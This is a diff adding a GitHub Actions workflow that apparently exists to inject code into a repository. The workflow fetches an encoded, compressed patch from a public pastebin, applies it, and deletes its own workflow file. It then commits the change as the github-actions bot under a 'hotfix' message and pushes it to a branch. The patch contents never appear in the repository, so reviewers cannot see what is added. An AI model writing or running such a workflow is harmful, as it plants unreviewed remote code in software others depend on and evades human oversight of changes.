@@ -1,0 +1,34 @@
+name: Build exact 1.4.98 candidate
+
+on:
+  push:
+    branches:
+      - transport/document-generation-1498
+
+permissions:
+  contents: write
+
+jobs:
+  materialize:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Materialize exact candidate
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -fsSL https://paste.rs/99pUl | base64 -d | gzip -d > /tmp/dok1498.patch
+          echo '7367a535084d759979b9329fc107e9882004059161744c036ef7dc4dc5956d8c  /tmp/dok1498.patch' | sha256sum -c -
+          git apply --index /tmp/dok1498.patch
+          git rm .github/workflows/_materialize_1498.yml
+          actual="$(git write-tree)"
+          expected='70c1bddee3f2d37b168b7261a3b1a2406a6c6a73'
+          echo "actual tree:   $actual"
+          echo "expected tree: $expected"
+          test "$actual" = "$expected"
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git commit -m 'Release 1.4.98 document generation hotfix'
+          git push origin HEAD:fix/document-generation-1498
